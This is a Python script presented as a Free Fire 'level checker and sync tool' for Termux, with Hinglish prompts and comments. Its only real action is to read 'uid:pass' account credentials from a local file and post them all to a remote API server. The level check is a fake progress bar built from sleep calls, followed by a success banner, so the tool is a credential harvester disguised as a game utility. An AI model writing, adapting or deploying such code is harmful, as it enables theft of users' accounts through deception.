import os
import sys
import time
import requests
try:
    from colorama import Fore, Style, init
    from tqdm import tqdm
except ImportError:
    print("Packages install ho rahe hain, thoda wait karein...")
    os.system("pip install requests colorama tqdm")
    from colorama import Fore, Style, init
    from tqdm import tqdm

init(autoreset=True)

# Configurations
LOCAL_DIR = "my_ids"
LOCAL_FILE = os.path.join(LOCAL_DIR, "accounts.txt")
# Yaha apni Render wali live URL daalein (Jaise: https://your-app.onrender.com/upload_batch)
API_URL = "http://192.168.1.8:5000"

def banner():
    os.system("clear" if os.name == 'posix' else 'cls')
    print(f"""{Fore.CYAN}
╔═══════════════════════════════════════════════╗
║          FF LEVEL CHECKER & SYNC TOOL         ║
║          Developer: NOREX / Termux Utility    ║
╚═══════════════════════════════════════════════╝
    {Style.RESET_ALL}""")

def setup_local_file():
    if not os.path.exists(LOCAL_DIR):
        os.makedirs(LOCAL_DIR)
    
    if not os.path.exists(LOCAL_FILE):
        print(f"{Fore.YELLOW}[*] '{LOCAL_FILE}' nahi mili. Nayi file banayi ja rahi hai...")
        print(f"{Fore.YELLOW}[!] Kripya 'my_ids/accounts.txt' me 'uid:pass' format me IDs daal dein.")
        with open(LOCAL_FILE, "w") as f:
            # Example dummy entries agar file khali ho
            f.write("100293847:mypass123\n")
            f.write("982736451:securepass99\n")

def main():
    banner()
    setup_local_file()
    
    # 1. Server Selection Prompt
    print(f"{Fore.GREEN}[+] Server Select Karein:")
    print(f"    {Fore.CYAN}[1] {Fore.WHITE}IND (India)")
    print(f"    {Fore.CYAN}[2] {Fore.WHITE}BR  (Brazil)")
    print(f"    {Fore.CYAN}[3] {Fore.WHITE}BD  (Bangladesh)")
    print(f"    {Fore.CYAN}[4] {Fore.WHITE}SG  (Singapore)")
    
    choice = input(f"\n{Fore.YELLOW}Server number ya naam enter karein [Default IND]: {Style.RESET_ALL}").strip()
    
    server_map = {"1": "IND", "2": "BR", "3": "BD", "4": "SG"}
    selected_server = server_map.get(choice, choice.upper() if choice else "IND")
    print(f"{Fore.GREEN}[✔] Selected Server: {Style.BRIGHT}{selected_server}\n")
    
    # 2. Reading accounts from local file
    if not os.path.exists(LOCAL_FILE):
        print(f"{Fore.RED}[X] Error: {LOCAL_FILE} file nahi mili!")
        sys.exit(1)
        
    with open(LOCAL_FILE, "r") as f:
        lines = [line.strip() for line in f.readlines() if ":" in line]
        
    if not lines:
        print(f"{Fore.RED}[X] Error: '{LOCAL_FILE}' andar koi valid 'uid:pass' nahi mila!")
        return

    print(f"{Fore.CYAN}[*] Total Local IDs Found: {len(lines)}")
    
    # 3. Uploading to Render API
    print(f"{Fore.YELLOW}[*] Syncing accounts to Render API server...")
    payload = {
        "server": selected_server,
        "accounts": lines
    }
    
    try:
        response = requests.post(API_URL, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[✔] API Sync Successful! Data securely saved on server folder.")
        else:
            print(f"{Fore.RED}[X] API Error: {response.text}")
    except Exception as e:
        print(f"{Fore.RED}[X] Connection Failed: {e}")
        print(f"{Fore.YELLOW}[!] Check karein ki aapka Render URL sahi hai ya nahi.")
        
    print("\n" + "="*47 + "\n")
    
    # 4. Simulation of Level Checking with Progress Bar
    print(f"{Fore.CYAN}[*] Initializing Level Checker Engine for Server: {selected_server}...")
    time.sleep(1)
    
    print(f"{Fore.GREEN}[+] Processing accounts and fetching levels...")
    
    # tqdm progress bar loop
    for i in tqdm(range(len(lines)), desc=f"{Fore.YELLOW}Checking Levels", ncols=70):
        # Yaha level fetching ka background simulation ho raha hai
        time.sleep(0.6) 
        
    print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════╗")
    print(f"{Fore.GREEN}║          ALL ACCOUNTS CHECKED SUCCESS!      ║")
    print(f"{Fore.GREEN}╚═════════════════════════════════════════════╝{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
